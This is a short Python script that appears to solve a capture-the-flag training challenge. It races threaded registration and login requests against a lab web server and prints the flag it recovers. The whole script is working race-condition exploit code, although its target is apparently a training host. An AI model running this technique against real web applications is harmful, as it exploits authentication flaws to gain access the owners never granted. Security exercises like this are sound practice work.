import requests
import threading
import time
import random
import string
import re

url="http://aart.training.jinblack.it/"
s = requests.Session()
r=""

def search_and_display_flag():
	search = re.search("flag{[a-zA-Z1-9_!]+}", r)
	if search:
		print(search.group())
		quit()

def gen_string():
	return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(15))

def register(s, u, p):
	data = {"username": u, "password": p}
	s.post(url+"/register.php", data)

def login(s, u, p):
	global r
	data = {"username": u, "password": p}
	r = s.post(url+"/login.php", data).text

while(True):
	u = gen_string()
	p = gen_string()
	t1 = threading.Thread(target=register, args=(s, u, p))
	t2 = threading.Thread(target=login, args=(s, u, p))
	t1.start()
	t2.start()
	t1.join()
	t2.join()
	search_and_display_flag()

